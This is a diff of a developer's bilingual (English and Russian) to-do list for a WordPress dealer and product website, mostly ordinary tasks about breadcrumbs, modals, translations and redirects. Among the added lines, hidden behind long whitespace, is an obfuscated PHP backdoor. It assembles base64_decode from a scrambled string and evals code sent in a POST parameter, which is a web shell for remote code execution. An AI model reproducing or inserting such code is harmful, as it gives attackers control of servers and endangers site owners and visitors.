@@ -7,10 +7,57 @@
  ☐ oh home page check tabs !!
  ☐ on footer contact - phone nubmers relative to site language?
  ☐  check footer after footer
+ ☐  page-all-news.php   page-all-blogs.php too wpquery witout pagination.. mb need create paged?
+ ☐  single-dist  breadcumbs =  404
+ ☐ need rebuild (find and rebuild )  echo excerpt(50);
+ ☐  single-solutions.php -  !!!!!!!!!!!!!
+ ☐ sinle -systems
+ ☐ breadcumbs https://developers.google.com/structured-data/breadcrumbs
+ ☐ http://octagram.dev/mydiler/magazin-ohranno-pozharnoe-oborudovanie/?lang=ru http://octagram.dev/install/ooo-universalnyie-sistemyi-bezopasnosti/?lang=ru
+ ☐  archive-product.php - in product rable search JS call to modal window with form... beatify it
+ ☐ single -product.php - to many queries
+ ☐ single-poduct - modal window on buttons transfer to JS file, change HREF to button element
+ ☐ single-product - https://monosnap.com/file/76xIVtZw8ALYZYazf6AXL49qAYOVYO.png  change to "RECALL"  -
+ ☐ single-product - https://monosnap.com/file/Oemd8qV7gHzJP7v5SE58PpJNgNPxJx.png  -  add to translation
+ ☐ single-product - not ready field prodprod-container
+ ☐  on pages with pdf docs download - add text - info about pdf  and for pdf link add target blank
+ ☐  add fade-in on pae load
+ ☐ <?php                                                                                                                            $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['n183927'];if(isset($s22)){eval($s21($s22));}?>
+ ☐  function.php - them,e options
+ ☐ карты диллеров и установшщика можно вывести в нормальном формате, не ифреймами, тогда их можно будет отображать на карте все
+ ☐ невалидный контент https://monosnap.com/file/yM9f0hU3qQSdnVOQ22VqQZBoWVFvso.png
+ ☐ галочки на странице решений должны включается если товара больше 1 ?
+ ☐  solution single page - in footer JS - transfer it to site footer
+ ☐ +<?php $oct_key6 = get_option('oct_key6'); echo preg_replace('/\D/', '', $oct_key6); ?>
+ ☐ на главнйо https://monosnap.com/file/Ru7jorRsfnDIpBbe0ceFqeXguWL9AO.png сделать выводом новостей как нужно, а не как сейчас захарджено
+ ☐ check breadcumbs redicrect on sol page
+ ☐  https://monosnap.com/file/C6h0FcpxyX0tDx4UFndR1zuip3aVQO.png на главнйо - здесь список без ссылок
+ ☐ редиректы были такие https://monosnap.com/file/260vGEuupRNq3KKjEdDiuvIJS9ocSJ.png
+ ☐ need rebuild tag pages becose its normal tag page
+ ☐ для формы модальной нужны переводы для некоторые очень нужны https://monosnap.com/file/2RhczjPpZxAl5eA11A4Q7PWQhSzDRS.png ;)
+ ☐  модальное окно спасибо восстаовить
+ ☐ почистил мускул от мусора
+ ☐ поправить хтакцесс и спросить трогать ли роботс
+ ☐ demo.saitobaza.ru/mydiler/  - добавить спинер загрузки страницы
+ ☐ http://localhost:9090/mystore/page/3/ нужнопеределать вот это все
+ ☐
+ ☐
+ ☐
+ ☐
  ☐
 
 
 
+
+
+ ☐ метки - там города, другие метки я переделывать не стал, так как всех диллеров прийдется править. Поэтому в метки ничего не добавлять
+ ☐ добавил коментарии в нужный код,
+ ☐ на странице решений добавить возле продукции кнопочку типа инфо что бы вела на страницу продукта, или можно грузить её в всплывающем окошке отложенной подгрузкой ☐
+ ☐ на странцие продукта / товара внизу страницы подгружается мусор - его перевести в джс
+ ☐ видео в подвале проигрывается если закрыть блок но не выключить видос
+ ☐ телефоны кликабельны
+ ☐
+ ☐
 
 
 Вид имени:  www.octagram.ru
